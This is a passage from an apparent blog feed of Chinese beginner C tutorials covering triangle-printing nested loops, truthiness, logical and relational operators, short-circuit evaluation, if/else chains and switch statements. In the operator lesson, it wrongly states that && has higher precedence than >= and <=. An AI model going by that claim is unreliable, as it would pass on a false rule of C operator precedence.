<span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//输出一个高度为5的左右对称的等腰三角形,要求使用循环</span></span><br><span class="line">    <span class="type">int</span> i, j, k;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span> - i; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">2</span> * i + <span class="number">1</span>; k++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么到现在,我们的程序就完成了.</p><h3 id="例子3-任意高度的等腰三角形">例子3-任意高度的等腰三角形</h3><h4 id="题目">题目</h4><p>同样如例子2,输出一个左右对称的等腰三角形;</p><p>要求输入一个正整数n,输出高度为n的等腰三角形.</p><p>同样要求使用循环,输入输出结果要求如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6</span></span><br><span class="line">     *</span><br><span class="line">    ***</span><br><span class="line">   *****</span><br><span class="line">  *******</span><br><span class="line"> *********</span><br><span class="line">***********</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="分析">分析</h4><p>处理过例子2,这个题很简单,只需要把之前的常量4(代表五行输出—从0开始计数)改为我们输入的变量n即可.</p><p>我们加入一个输入n.</p><p>我们之前的<code>for (i = 0; i &lt; 5; i++)</code>变为<code>for (i = 0; i &lt; n; i++)</code></p><p><code>for (k = 0; k &lt; 2 * i + 1; k++)</code>不变</p><p><code>for (j = 0; j &lt; 4 - i; j++)</code>变为<code>for (j = 0; j &lt; n - 1 - i; j++)</code></p><p>注意,这里之所以写<code>n-1-i</code>而不是<code>n-i</code>,是因为我们输入的是图像的高度,而代码中我们从0开始计数!所以需要减1!</p><h4 id="代码">代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//输出一个高度为n的左右对称的等腰三角形,要求使用循环</span></span><br><span class="line">    <span class="type">int</span> i, j, k, n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n - <span class="number">1</span> - i; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">2</span> * i + <span class="number">1</span>; k++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外,我们发现需要4个变量,未免有点多余,实际上我们仅需要3个:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//输出一个高度为n的左右对称的等腰三角形,要求使用循环</span></span><br><span class="line">    <span class="type">int</span> i, j, n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n - <span class="number">1</span> - i; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">2</span> * i + <span class="number">1</span>; j++) &#123; <span class="comment">// 这里也使用j</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之所以能这么写,是因为内层的两个循环是平行的,就这个程序而言,互不影响,因为两个for都需要再开始前进行<code>j=0</code>,所以,我们把原来的k换成j即可.</p><h2 id="其他各种嵌套">其他各种嵌套</h2><p>这里仅仅写一下结构,事实上,完全没有必要,因为实际编程中完全是我们想怎么写,或者说需要怎么写,我们就按照自己的想法去写即可,完全没有任何限制.</p><p>因为,嵌套就是一个语句内有其他语句,并没有规定两者间的联系,你甚至可以在一个<code>do...while()循环</code>中嵌套一个<code>switch语句</code>,完全没有任何问题.</p><p>我们可以这样:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">        &#125;<span class="keyword">while</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> flag=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">            <span class="keyword">if</span>(...)&#123;</span><br><span class="line">                flag=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面仅仅举了两个任意的框架作为例子而已,实际上随意,而且并不是一个循环中只能套一个循环,你可以放入任意数量/排列的语句(包括<code>复合语句</code>)</p><p>而且,我们还可以进行3层嵌套,4层嵌套…只要不超出编译器允许的范围…当然,一般嵌套层数超过了4,你可能就需要重新考虑你的代码结构了…因为他不仅看起来不美观,而且往往效率极低…</p><br><p>到此,我们介绍了跳转控制和嵌套的基本思路,具体的掌握还需要各位多去练习,例如上网随便找<code>C语言练习100题</code>之类的,一搜一大把.</p><p>​—WAHAHA 2023.9.29</p><br><br><p>上一篇:<a href="../2023-09-24-6c790fce4667">c语言教程-7-选择执行</a></p><p>下一篇:<a href="../2023-09-30-a60ec9bcedd8">C语言教程-9-运算符及其优先级和求值顺序</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>古典密码</title>
      <link href="/2023-09-25-5ca27d3d86ce/"/>
      <url>/2023-09-25-5ca27d3d86ce/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 加密算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-6-选择执行</title>
      <link href="/2023-09-24-7a3f77e5bcf7/"/>
      <url>/2023-09-24-7a3f77e5bcf7/</url>
      
        <content type="html"><![CDATA[<p>我们已经知道了最基本的程序如何进行顺序执行,但是,几乎所有实际有用的程序都会有条件判断,甚至会<code>根据不同的条件执行不同的代码</code>.</p><p>那么如果程序中需要进行条件判断,进而选择不同的路径进行执行(即执行一部分代码,同时忽略另一部分代码),我们就需要语言支持<code>选择流程控制</code>.</p><p>我们来学习C语言是如何实现<code>条件判断</code>和<code>选择控制</code>的.</p><h1 id="前置知识">前置知识</h1><h2 id="什么是真-什么是假">什么是真,什么是假</h2><p>不像其他语言,C语言(包括C++)十分简单粗暴:<code>0是假,只要不是0,那么就都是真</code></p><p>这句话隐含一个非常的事情—那就是C语言中所有的值都可以用于判断,也就是说,不像其他语言有类似bool这样专门的类型,C语言只要是任何一个表达式,都可以用于逻辑判断,并且,即使是逻辑表达式,其结果也只会使普通的1(真)或0(假).</p><p>那么问题来了:</p><p>1.默认情况下,0是假,1是真,那么2,3,4,5这样的数是真还是假呢?</p><p>​答案是<code>真</code>!因为<code>非0即为真</code>,只要不是整数0,那么都是真值,同理,一个浮点数1.1也是<code>真</code>.</p><p>2.最重要的一个问题,也是最容易忽略的一个问题,像-1,-2,-3这样的负数是真还是假呢?</p><p>​答案也是<code>真</code>!因为<code>非0即为真</code>,负数怎么可能等于0呢?那不就是<code>真</code>的嘛.</p><h2 id="逻辑运算符和关系运算符简介">逻辑运算符和关系运算符简介</h2><h3 id="逻辑运算符">逻辑运算符</h3><p>很显然,逻辑运算符用于进行逻辑判断,其构成的逻辑表达式返回1(成立)或0(不成立)这两个整数中的某一个.</p><p>这里简单的介绍一下,非常简单.</p><p>逻辑运算符有3种—与或非,分别是<code>&amp;&amp;</code>,<code>||</code>和<code>!</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">`&amp;&amp;`就是`与`的意思,例如`a&amp;&amp;b`要求a和b必须都是真的,整个表达式才是真的</span><br><span class="line"></span><br><span class="line">`||`就是`或`的意思,例如`a||b`要求a和b只要有一个是真的,整个表达式就是真的</span><br><span class="line"></span><br><span class="line">!就是`非`的意思,他只有一个操作数,例如`!a`就是对a取反,如果`a`为真,那么`!a`就是`假`;如果`a`为假,那么`!a`就是`真`</span><br></pre></td></tr></table></figure><p>以上的a和b都是表达式,无论复杂度多高,只要是一个合法的表达式即可</p><p>并且,虽然非0即为真,但是作为逻辑运算符,其结果一定是1或0</p><h4 id="重点-短路效应">重点:短路效应</h4><p>同时,<code>&amp;&amp;</code>和<code>||</code>还有一个非常非常重要的特性,那就是<code>短路</code></p><p>1.对于<code>a&amp;&amp;b</code></p><p>短路的意思是,如果对表达式a求值,发现a已经是假的了,那么对b求值已经无所谓了,因为整个表达式势必是假,所以C编译器没有必要再费功夫去计算b,则直接返回假(0),这个现象叫做<code>短路与</code></p><p>2.对于<code>a||b</code></p><p>短路的意思是,如果对表达式a求值,发现a已经是真的了,那么对b求值已经无所谓了,因为整个表达式势必是真,所以C编译器没有必要再费功夫去计算b,则直接返回真(1),这个现象叫做<code>短路或</code></p><p>短路效应应该很好理解,可以理解为,如果前一个表达式已经足以说明最终的结果了,那么就没有必要再去计算后面的表达式,从效果上看就好像后面的表达式被<code>短路</code>了一样.</p><h4 id="注意事项">注意事项</h4><p>同时,必须注意的一点是:所谓的短路,指的是完全不进行求值,而不是求值后无效果!</p><p>之所以要说明这一点的原因是:任何表达式都可以作为逻辑运算符的运算对象,而并不是所有的表达式运算后都没有任何影响的.</p><p>例如,我们之前讲解的赋值运算符,如<code>a=3</code>,这将给a赋一个新值3,但是实际上,这个效应可以理解为对<code>a=3</code>这个表达式进行求值的<code>副作用</code>,因为<code>a=3</code>不仅仅只是给a赋值那么简单,他要返回一个值,而这个值就是=左边的a的值.</p><p>那么既然<code>a=3</code>也会返回一个值,那么他就有权利成为<code>&amp;&amp;</code>或者<code>||</code>的运算对象—3代表<code>真</code>,如果这个表达式作为第二个表达式,如果他被计算,那么a就会被覆盖为3,但是如果他被短路了,那么<code>a=3</code>就根本不会被计算(求值),进而a仍然保留原值.</p><p>如果上述的结果并不是你想要的,那么这就是一个严重的逻辑错误,因为a的值很可能在判断的过程中就已经被破坏了!!!</p><p>这个问题十分重要,同时提前引入了<code>表达式的副作用</code>这个重要概念,相关的讲解将会在后续讲解<code>运算符</code>和<code>求值顺序</code>等相关知识时进行详细的讲解!</p><h3 id="关系运算符">关系运算符</h3><p>比起逻辑运算符,关系运算符可能更容易一点,说简单点,就是比大小.</p><p>他们同样返回1或0.下图截取自<a href="https://www.runoob.com/cprogramming/c-operators.html">菜鸟教程</a></p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230924195636312.png" alt="image-20230924195636312" style="zoom: 50%;" /></p><p>注意,<code>==</code>运算符需要两个<code>=</code>,而非一个<code>=</code>,这与一些语言并不相同.一个<code>=</code>在C语言中是<code>赋值运算符</code>.</p><h1 id="什么是选择执行">什么是选择执行</h1><p>大多数问题的求解中不可能只出现一种情况,甚至是在运算过程中必然出现需要选择的情况,此时,我们就需要根据当前的情况(也就是分支条件)选择一条适当的部分进行执行,而忽略另外的部分.</p><p>例如,我们的问题是<code>输出2个数a,b中的最大值</code>,这就面临一个最简单的选择:究竟是a大还是b大,显然,如果a大则输出a,如果b大则只会输出b. C语言的选择语句就是为了处理这种情况所设计.</p><h1 id="if选择语句">if选择语句</h1><p>所有的高级语言都有流程控制语句的实现,而且目前主流的几种语言的语法都是相似的.</p><p>C语言中,使用<code>if...else if...else语句</code>进行选择控制.需要提出的一点是,这里所说的语句和标准表述的不同,但是为了更好地理解,这里把他们整合为一个大的语句.</p><p>该语句的结构如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(表达式<span class="number">1</span>)&#123;</span><br><span class="line"><span class="comment">//代码块1</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(表达式<span class="number">2</span>)&#123;</span><br><span class="line"><span class="comment">//代码块2</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(表达式<span class="number">3</span>)&#123;</span><br><span class="line"><span class="comment">//代码块3</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(...)&#123;</span><br><span class="line">...</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(代码块n)&#123;</span><br><span class="line"><span class="comment">//代码块n</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//代码块n+1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的一点是,上面说的各个表达式,实际上可以是任何表达式(返回值的),因为使用了关系运算符和逻辑运算符的条件,实际上也是表达式,因为他们返回1或0这两种逻辑值,所以用于逻辑判断是没有问题的.</p><p>一般情况下,我们确实仅仅将逻辑表达式放进去,但是后续我们会看到一些更&quot;高级&quot;/&quot;抽象&quot;的写法.</p><p>if语句对<code>括号()</code>中的<code>表达式</code>进行<code>求值</code>,对应到包含有关系运算符和逻辑运算符的<code>表达式</code>自然就是判断条件.</p><p>其中,可以看出<code>else if()&#123;&#125;</code>的数量从逻辑上并没有任何限制(但是编译器有最大限制,基本用不到那么多的分支),编译器允许我们的数量足够我们使用.<code>else if()&#123;&#125;</code>的用途是,如果我们在<code>if()</code>中的条件(表达式1)并不符合,我们可以继续判断其他的条件,依次判断,直到确定进入一个<code>else if()&#123;&#125;</code>中.</p><p>同理,<code>else&#123;&#125;</code>用于如果<code>if()&#123;&#125;</code>和所有的<code>else if()&#123;&#125;</code>都不满足条件,那么将会执行else中的<code>代码块n+1</code>.</p><p>另一方面,除了第一个<code>if()&#123;&#125;</code>是必须有且仅有一个,其他所有的<code>else if()&#123;&#125;</code>和必须放在最后的<code>else&#123;&#125;</code>都是可有可无的,他们是否存在取决于你的代码是否需要这么多平行的条件.</p><p>讲了这么多理论,理解力强的朋友可能已经懂了,但是为了清楚说明,还是要举几个例子.</p><h2 id="示例">示例</h2><h3 id="菜单选择">菜单选择</h3><p>写一个程序,输入1,2,3中的一个数,分别输出&quot;hello&quot;,“good”,“great”,如果输入的不是1,2,3中的任何数,则输出&quot;sorry&quot;.</p><p>代码很简单:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(n==<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;good&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(n==<span class="number">3</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;great&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;sorry&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读者可以尝试运行一下.其中,<code>else&#123;&#125;</code>即用于处理<strong>除了1,2,3以外任何输入的值</strong>!</p><h3 id="成绩评级">成绩评级</h3><p>输入一个0~100的整数作为成绩,</p><p>如果大于等于90,评为A;</p><p>如果大于等于80且小于90,评为B;</p><p>如果大于等于60且小于80,评为C;</p><p>如果小于60,评为D.</p><p>这里的判断要用到关系运算符(也就是比大小):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> score;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;score); <span class="comment">// 用于输入</span></span><br><span class="line"><span class="keyword">if</span> (score &gt;= <span class="number">90</span> &amp;&amp; score &lt;= <span class="number">100</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;A&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">80</span> &amp;&amp; score &lt; <span class="number">90</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;B&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">60</span> &amp;&amp; score &lt; <span class="number">80</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;C&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (score &lt; <span class="number">60</span> &amp;&amp; score &gt;= <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;D&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;错误,必须为0~100的成绩&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="讲解">讲解</h3><p>从<code>成绩评级</code>这个程序中,我们可以看到,我们使用了一个较为复杂的表达式,用于限定score变量的范围,我们使用了<code>&lt;=</code>和<code>&gt;=</code>来界定,同时使用<code>&amp;&amp;</code>来连接这两个子表达式.</p><p>必须注意的是,<code>&amp;&amp;</code>的<code>优先级</code>比<code>&gt;=</code>和<code>&lt;=</code>高,这意味着先判断<code>&lt;=</code>和<code>&gt;=</code>,然后才会把两个判断的结果<code>&amp;&amp;</code>起来.</p><p>依旧,有关<code>优先级</code>的知识将会放在后面进行讲解.</p><p>另一方面,我们加入了<code>score&lt;=100</code>和<code>score&gt;=0</code>的判断,用于处理错误输入—这意味着我们意识到运行该程序的人可能输入一个错误的值来测试我们的程序.</p><p>如果我们只关心问题的求解,而不去关心一些可能出现的异常情况,那么一旦出现一些误输入,甚至是故意而为之,我们的程序就会给出错误的结果,甚至崩溃.</p><p>这里的多一步判断,实际上加强了该程序的<code>健壮性</code>,也就是说,这个程序能一定程度上处理一些错误操作,而不会发生错误.</p><p>作为程序的编写者,不要指望使用程序的人(甚至是我们自己)有多么高明,他可能会不小心输入各种错误信息,或者会故意输入错误的信息,此时,就需要你去进行良好的处理.</p><p>​</p><h1 id="switch语句">switch语句</h1><p>除了if语句,如果我们判断的只是一个表达式的值—整数,那么我们可以使用switch语句来简化.</p><p>switch的一般结构是这样的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(表达式)&#123;</span><br><span class="line"><span class="keyword">case</span> 常量<span class="number">1</span>:</span><br><span class="line"><span class="comment">//代码段1</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> 常量<span class="number">2</span>:</span><br><span class="line"><span class="comment">//代码段2</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">... <span class="comment">// 任意数量的case语句---同样不能超出编译器允许的最大数量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> 常量n:</span><br><span class="line"><span class="comment">//代码段n</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="comment">//默认执行代码段</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解释">解释</h2><p>1.在上面的模板中,我们只对<code>表达式</code>进行一次求值,然后对这个值<code>从上向下</code>依次尝试匹配,如果一旦从一众常量中匹配到一个,那么就从该case进入,依次向下执行代码,直到遇到<code>break;</code>结束或者switch尾部结束.</p><p>2.必须注意的是,<code>表达式求值后必须为整数</code>,因为我们要对其进行精确匹配,而浮点数会有精度问题,很难保持绝对的相等.</p><p>3.非常重要的一点是:case仅仅是一个<code>标号</code>—C语言中的case是真正意义上的标号而已,一旦匹配到后,就不会对后面的语句有任何影响,于是,如果你的当前case没有<code>break;</code>,那么他会穿过下一个没有匹配到的case一直执行下去,直到在任何地方遇到一个<code>break;</code>或者switch尾部才结束—我们会举例强调这个重要特性!</p><p>4.default可有可无,而且其位置任意.这意味着两件事:首先,default类似<code>else&#123;&#125;</code>,只要没有匹配到任何case标签,那么就会执行default;其次,default可以放在任意case之前/之后,对其没有任何影响,但是作为规范,我们一般都将其放在最后!</p><p>上面的解释实际已经非常全面了,如果一下子没有完全理解,不要紧,我们上例子:</p><h2 id="示例">示例</h2><h3 id="模拟菜单">模拟菜单</h3><p>我们模拟一个选择菜单,输入1,2,3,4分别输出&quot;开始游戏&quot;,“查看排名”,“设置”,“退出”,如果没有匹配到就输出&quot;输入错误&quot;.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> score;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;score); <span class="comment">// 用于输入</span></span><br><span class="line">    <span class="keyword">switch</span> (score) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;开始游戏&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;查看排名&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;设置&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;退出&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;输入错误&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>就是这么简单,记得每个printf后面都要加上<code>break;</code>,因为default在最后面,所以可以不加break.下面我们尝试一下如果不加break会发生什么:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 